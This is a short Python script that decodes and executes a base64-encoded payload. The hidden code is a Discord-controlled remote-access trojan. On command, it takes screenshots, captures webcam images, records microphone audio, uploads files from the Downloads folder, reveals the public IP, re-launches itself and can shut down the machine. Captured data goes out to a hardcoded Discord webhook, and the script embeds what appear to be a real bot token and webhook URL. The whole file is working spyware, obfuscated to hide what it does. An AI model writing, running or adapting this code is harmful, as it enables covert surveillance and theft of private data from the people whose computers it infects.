import base64


encoded_script = """
<aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgZGlzY29yZAppbXBvcnQgY3YyCmltcG9ydCBzb3VuZGRldmljZSBhcyBzZApmcm9tIHNjaXB5LmlvLndhdmZpbGUgaW1wb3J0IHdyaXRlCmZyb20gZGlzY29yZC5leHQgaW1wb3J0IGNvbW1hbmRzCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzdWJwcm9jZXNzICAjIE1vZHVsZSBmb3IgcmVvcGVuaW5nL3JlcnVubmluZyB0aGUgZmlsZQoKIyBSZXBsYWNlIHdpdGggeW91ciBEaXNjb3JkIHdlYmhvb2sgVVJMCldFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDAwODM3NjM2ODYwMTkxOTMvWGlJa3BkWHJtdFNXUldZMEJ0cEFybm00TzVTWnRkd2FoVGYtOGFtYXhqaDB1T3hBSHlxQVhzVHZIVzNFem04ZUpKX3MiCgojIFNwZWNpZnkgeW91ciBib3QgdG9rZW4gYW5kIGNoYW5uZWwgSUQKQk9UX1RPS0VOID0gIk1UTXdNREF5T0RVMk1EazNPVEF3TlRRMk1BLkdvTEFscC5yRUZPenYtT3RWR0N1cGxjS2JjbExkeWlkRTFsLV9KeEdOSFNJQSIKVEFSR0VUX0NIQU5ORUxfSUQgPSAxMjc1NTM3MTU3OTU1NzgwNzAwICAjIFJlcGxhY2Ugd2l0aCB5b3VyIGNoYW5uZWwgSUQKCiMgU2V0IHVwIHRoZSBib3Qgd2l0aCBhcHByb3ByaWF0ZSBpbnRlbnRzCmludGVudHMgPSBkaXNjb3JkLkludGVudHMuZGVmYXVsdCgpCmludGVudHMubWVzc2FnZV9jb250ZW50ID0gVHJ1ZSAgIyBBbGxvd3MgYWNjZXNzIHRvIG1lc3NhZ2UgY29udGVudApib3QgPSBjb21tYW5kcy5Cb3QoY29tbWFuZF9wcmVmaXg9IiEiLCBpbnRlbnRzPWludGVudHMpCgojIEZsYWcgdG8gY29udHJvbCB0aGUgdGVybWluYXRpb24gcHJvY2Vzcwp0ZXJtaW5hdGVfYWN0aXZlID0gVHJ1ZQoKQGJvdC5ldmVudAphc3luYyBkZWYgb25fcmVhZHkoKToKICAgIHByaW50KGYiTG9nZ2VkIGluIGFzIHtib3QudXNlcn0iKQogICAgY2hhbm5lbCA9IGJvdC5nZXRfY2hhbm5lbChUQVJHRVRfQ0hBTk5FTF9JRCkKICAgIGlmIGNoYW5uZWw6CiAgICAgICAgYXdhaXQgY2hhbm5lbC5zZW5kKCJCb3QgaXMgbm93IGFjdGl2ZSBhbmQgcmVhZHkgZm9yIGNvbW1hbmRzISIpCgpAYm90LmNvbW1hbmQoKQphc3luYyBkZWYgc3MoY3R4KToKICAgIGlmIGN0eC5jaGFubmVsLmlkICE9IFRBUkdFVF9DSEFOTkVMX0lEOgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJUaGlzIGNvbW1hbmQgY2FuIG9ubHkgYmUgdXNlZCBpbiB0aGUgZGVzaWduYXRlZCBjaGFubmVsLiIpCiAgICAgICAgcmV0dXJuCgogICAgc2NyZWVuc2hvdF9maWxlbmFtZSA9IGYic2NyZWVuc2hvdF97ZGF0ZXRpbWUubm93KCkuc3RyZnRpbWUoJyVZJW0lZF8lSCVNJVMnKX0ucG5nIgogICAgc2NyZWVuc2hvdF9wYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiRG93bmxvYWRzIiwgc2NyZWVuc2hvdF9maWxlbmFtZSkKICAgIHNjcmVlbnNob3QgPSBJbWFnZUdyYWIuZ3JhYigpCiAgICBzY3JlZW5zaG90LnNhdmUoc2NyZWVuc2hvdF9wYXRoKQoKICAgIHdpdGggb3BlbihzY3JlZW5zaG90X3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KAogICAgICAgICAgICBXRUJIT09LX1VSTCwKICAgICAgICAgICAgZmlsZXM9eyJmaWxlIjogZn0sCiAgICAgICAgICAgIGRhdGE9eyJjb250ZW50IjogZiJTY3JlZW5zaG90IHRha2VuIGJ5IHtjdHguYXV0aG9yLm1lbnRpb259In0sCiAgICAgICAgKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwNDoKICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlNjcmVlbnNob3Qgc2VudCBzdWNjZXNzZnVsbHkuIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiRmFpbGVkIHRvIHNlbmQgc2NyZWVuc2hvdC4iKQogICAgICAgICAgICBwcmludChmIkVycm9yOiB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IC0ge3Jlc3BvbnNlLnRleHR9IikKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiB3YihjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgIT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKICAgICAgICByZXR1cm4KCiAgICBjYW0gPSBjdjIuVmlkZW9DYXB0dXJlKDApCiAgICByZXQsIGZyYW1lID0gY2FtLnJlYWQoKQogICAgY2FtLnJlbGVhc2UoKQogICAgCiAgICBpZiBub3QgcmV0OgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJGYWlsZWQgdG8gY2FwdHVyZSBpbWFnZSBmcm9tIHdlYmNhbS4iKQogICAgICAgIHJldHVybgoKICAgIHdlYmNhbV9maWxlbmFtZSA9IGYid2ViY2FtX3tkYXRldGltZS5ub3coKS5zdHJmdGltZSgnJVklbSVkXyVIJU0lUycpfS5wbmciCiAgICB3ZWJjYW1fcGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwgIkRvd25sb2FkcyIsIHdlYmNhbV9maWxlbmFtZSkKICAgIGN2Mi5pbXdyaXRlKHdlYmNhbV9wYXRoLCBmcmFtZSkKCiAgICB3aXRoIG9wZW4od2ViY2FtX3BhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KAogICAgICAgICAgICBXRUJIT09LX1VSTCwKICAgICAgICAgICAgZmlsZXM9eyJmaWxlIjogZn0sCiAgICAgICAgICAgIGRhdGE9eyJjb250ZW50IjogZiJXZWJjYW0gcGljdHVyZSB0YWtlbiBieSB7Y3R4LmF1dGhvci5tZW50aW9ufSJ9LAogICAgICAgICkKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDQ6CiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCJXZWJjYW0gcGljdHVyZSBzZW50IHN1Y2Nlc3NmdWxseS4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKCJGYWlsZWQgdG8gc2VuZCB3ZWJjYW0gcGljdHVyZS4iKQogICAgICAgICAgICBwcmludChmIkVycm9yOiB7cmVzcG9uc2Uuc3RhdHVzX2NvZGV9IC0ge3Jlc3BvbnNlLnRleHR9IikKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiB2YyhjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgIT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgZnMgPSA0NDEwMAogICAgICAgIHNlY29uZHMgPSA1CgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJSZWNvcmRpbmcgYXVkaW8uLi4iKQoKICAgICAgICBhdWRpb19kYXRhID0gc2QucmVjKGludChzZWNvbmRzICogZnMpLCBzYW1wbGVyYXRlPWZzLCBjaGFubmVscz0yKQogICAgICAgIHNkLndhaXQoKQoKICAgICAgICBhdWRpb19maWxlbmFtZSA9IGYidm9pY2Vfe2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWSVtJWRfJUglTSVTJyl9LndhdiIKICAgICAgICBhdWRpb19wYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiRG93bmxvYWRzIiwgYXVkaW9fZmlsZW5hbWUpCiAgICAgICAgd3JpdGUoYXVkaW9fcGF0aCwgZnMsIGF1ZGlvX2RhdGEpCgogICAgICAgIHdpdGggb3BlbihhdWRpb19wYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICAgICBXRUJIT09LX1VSTCwKICAgICAgICAgICAgICAgIGZpbGVzPXsiZmlsZSI6IGZ9LAogICAgICAgICAgICAgICAgZGF0YT17ImNvbnRlbnQiOiBmIlZvaWNlIG1lc3NhZ2UgcmVjb3JkZWQgYnkge2N0eC5hdXRob3IubWVudGlvbn0ifSwKICAgICAgICAgICAgKQogICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDQ6CiAgICAgICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiVm9pY2UgbWVzc2FnZSBzZW50IHN1Y2Nlc3NmdWxseS4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIkZhaWxlZCB0byBzZW5kIHZvaWNlIG1lc3NhZ2UuIikKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0gLSB7cmVzcG9uc2UudGV4dH0iKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBhd2FpdCBjdHguc2VuZChmIkFuIGVycm9yIG9jY3VycmVkIGR1cmluZyByZWNvcmRpbmc6IHtzdHIoZSl9IikKICAgICAgICBwcmludChmIkVycm9yOiB7ZX0iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIFMoY3R4KToKICAgIGlmIGN0eC5jaGFubmVsLmlkID09IFRBUkdFVF9DSEFOTkVMX0lEOgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJTaHV0dGluZyBkb3duIHRoZSBjb21wdXRlci4uLiIpCiAgICAgICAgY3VycmVudF9vcyA9IHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCkKICAgICAgICBpZiBjdXJyZW50X29zID09ICJ3aW5kb3dzIjoKICAgICAgICAgICAgb3Muc3lzdGVtKCJzaHV0ZG93biAvcyAvdCAxIikKICAgICAgICBlbGlmIGN1cnJlbnRfb3MgPT0gImxpbnV4IiBvciBjdXJyZW50X29zID09ICJkYXJ3aW4iOgogICAgICAgICAgICBvcy5zeXN0ZW0oInN1ZG8gc2h1dGRvd24gbm93IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgiU2h1dGRvd24gY29tbWFuZCBub3Qgc3VwcG9ydGVkIG9uIHRoaXMgT1MuIikKICAgIGVsc2U6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiByZShjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgPT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlJlb3BlbmluZyB0aGUgUHl0aG9uIGZpbGUuLi4iKQoKICAgICAgICAjIEdldCB0aGUgY3VycmVudCBmaWxlIHBhdGgKICAgICAgICBjdXJyZW50X2ZpbGUgPSBvcy5wYXRoLmFic3BhdGgoX19maWxlX18pCgogICAgICAgIHRyeToKICAgICAgICAgICAgIyBSZXJ1biB0aGUgY3VycmVudCBQeXRob24gZmlsZQogICAgICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKFsicHl0aG9uIiwgY3VycmVudF9maWxlXSkKICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlB5dGhvbiBmaWxlIGhhcyBiZWVuIHJlb3BlbmVkLiIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIkZhaWxlZCB0byByZW9wZW4gdGhlIGZpbGU6IHtzdHIoZSl9IikKICAgICAgICAgICAgcHJpbnQoZiJFcnJvciByZW9wZW5pbmcgZmlsZToge2V9IikKICAgIGVsc2U6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKCkBib3QuY29tbWFuZCgpCmFzeW5jIGRlZiBjbG9zZShjdHgpOgogICAgaWYgY3R4LmNoYW5uZWwuaWQgPT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIkJvdCBpcyBzaHV0dGluZyBkb3duLi4uIikKICAgICAgICBhd2FpdCBib3QuY2xvc2UoKQogICAgZWxzZToKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHN0KGN0eCk6CiAgICBnbG9iYWwgdGVybWluYXRlX2FjdGl2ZQogICAgaWYgY3R4LmNoYW5uZWwuaWQgIT0gVEFSR0VUX0NIQU5ORUxfSUQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRoaXMgY29tbWFuZCBjYW4gb25seSBiZSB1c2VkIGluIHRoZSBkZXNpZ25hdGVkIGNoYW5uZWwuIikKICAgICAgICByZXR1cm4KCiAgICB0ZXJtaW5hdGVfYWN0aXZlID0gRmFsc2UgICMgU3RvcCB0aGUgdGVybWluYXRpb24gY29tbWFuZAogICAgYXdhaXQgY3R4LnNlbmQoIlRlcm1pbmF0aW9uIGNvbW1hbmQgaGFzIGJlZW4gc3RvcHBlZC4iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIHRlcm1pbmF0ZShjdHgpOgogICAgZ2xvYmFsIHRlcm1pbmF0ZV9hY3RpdmUKICAgIGlmIGN0eC5jaGFubmVsLmlkICE9IFRBUkdFVF9DSEFOTkVMX0lEOgogICAgICAgIGF3YWl0IGN0eC5zZW5kKCJUaGlzIGNvbW1hbmQgY2FuIG9ubHkgYmUgdXNlZCBpbiB0aGUgZGVzaWduYXRlZCBjaGFubmVsLiIpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbm90IHRlcm1pbmF0ZV9hY3RpdmU6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIlRlcm1pbmF0aW9uIGNvbW1hbmQgaXMgY3VycmVudGx5IHN0b3BwZWQuIikKICAgICAgICByZXR1cm4KCiAgICAjIERlZmluZSB0aGUgZGlyZWN0b3J5IHRvIGNvbGxlY3QgZmlsZXMgZnJvbQogICAgZGlyZWN0b3J5ID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+L0Rvd25sb2FkcyIpICAjIENoYW5nZSB0aGlzIHRvIHlvdXIgdGFyZ2V0IGRpcmVjdG9yeQogICAgZmlsZXNfdG9fc2VuZCA9IFtdCgogICAgIyBDb2xsZWN0IGZpbGVzIGZyb20gdGhlIGRpcmVjdG9yeQogICAgZm9yIGZpbGVuYW1lIGluIG9zLmxpc3RkaXIoZGlyZWN0b3J5KToKICAgICAgICBpZiBmaWxlbmFtZS5lbmRzd2l0aCgiLnBuZyIpIG9yIGZpbGVuYW1lLmVuZHN3aXRoKCIud2F2Iik6ICAjIEFkZCBvdGhlciBleHRlbnNpb25zIGFzIG5lZWRlZAogICAgICAgICAgICBmaWxlc190b19zZW5kLmFwcGVuZChvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCBmaWxlbmFtZSkpCgogICAgaWYgbm90IGZpbGVzX3RvX3NlbmQ6CiAgICAgICAgYXdhaXQgY3R4LnNlbmQoIk5vIGZpbGVzIGZvdW5kIHRvIHNlbmQuIikKICAgICAgICByZXR1cm4KCiAgICAjIFNlbmQgZWFjaCBmaWxlIHRvIHRoZSBEaXNjb3JkIHdlYmhvb2sKICAgIGZvciBmaWxlX3BhdGggaW4gZmlsZXNfdG9fc2VuZDoKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICAgICBXRUJIT09LX1VSTCwKICAgICAgICAgICAgICAgIGZpbGVzPXsiZmlsZSI6IGZ9LAogICAgICAgICAgICAgICAgZGF0YT17ImNvbnRlbnQiOiBmIkZpbGUgc2VudDoge29zLnBhdGguYmFzZW5hbWUoZmlsZV9wYXRoKX0ifSwKICAgICAgICAgICAgKQogICAgICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDQ6CiAgICAgICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIkZhaWxlZCB0byBzZW5kIGZpbGUge29zLnBhdGguYmFzZW5hbWUoZmlsZV9wYXRoKX0uIikKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtyZXNwb25zZS5zdGF0dXNfY29kZX0gLSB7cmVzcG9uc2UudGV4dH0iKQoKICAgIGF3YWl0IGN0eC5zZW5kKCJGaWxlcyBzZW50IHN1Y2Nlc3NmdWxseS4iKQoKQGJvdC5jb21tYW5kKCkKYXN5bmMgZGVmIGlwKGN0eCk6CiAgICBpZiBjdHguY2hhbm5lbC5pZCAhPSBUQVJHRVRfQ0hBTk5FTF9JRDoKICAgICAgICBhd2FpdCBjdHguc2VuZCgiVGhpcyBjb21tYW5kIGNhbiBvbmx5IGJlIHVzZWQgaW4gdGhlIGRlc2lnbmF0ZWQgY2hhbm5lbC4iKQogICAgICAgIHJldHVybgoKICAgICMgVXNlIGFuIGV4dGVybmFsIHNlcnZpY2UgdG8gZ2V0IHRoZSB1c2VyJ3MgcHVibGljIElQIGFkZHJlc3MKICAgIHRyeToKICAgICAgICBpcF9yZXNwb25zZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJykKICAgICAgICBpcF9kYXRhID0gaXBfcmVzcG9uc2UuanNvbigpCiAgICAgICAgaXBfYWRkcmVzcyA9IGlwX2RhdGFbJ2lwJ10KICAgICAgICBhd2FpdCBjdHguc2VuZChmIllvdXIgSVAgYWRkcmVzcyBpczoge2lwX2FkZHJlc3N9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBhd2FpdCBjdHguc2VuZCgiQ291bGQgbm90IHJldHJpZXZlIElQIGFkZHJlc3MuIikKICAgICAgICBwcmludChmIkVycm9yIHJldHJpZXZpbmcgSVA6IHtlfSIpCgojIFJ1biB0aGUgYm90CmJvdC5ydW4oQk9UX1RPS0VOKQo=>
"""


exec(base64.b64decode(encoded_script).decode('utf-8'))
